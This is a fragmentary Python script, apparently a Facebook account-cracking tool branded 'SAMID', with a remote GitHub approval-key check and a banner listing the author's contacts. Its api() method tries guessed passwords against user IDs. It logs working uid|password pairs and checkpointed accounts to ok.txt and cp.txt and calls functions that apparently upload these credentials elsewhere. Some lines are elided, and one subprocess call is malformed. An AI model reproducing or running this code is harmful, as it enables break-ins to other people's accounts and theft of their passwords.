...
def helpnote():
	...
	subprocess.check_output(["am", "start", "plr = requests.get('https://github.com/SAMID-CYBER/POWER-FULL/blob/main/Approval.txt').text"])
	exit(" [*] FACEBOOK :  Samid Khan ")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰SAMID")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/SAMID-CYBER/POWER-FULL/blob/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═════╝                                   
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Samid Khan 
\033[1;91m [\033[1;94m✓\033[1;91m]
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : SAMID-CYBER 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01941171364
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: SAMID): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SAMID_OLD] : %s/%s -> \033[0;92m [ SAMID-OK:%s ]- \033[0;91m[SAMID-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SAMID-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SAMID-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SAMID-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SAMID-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
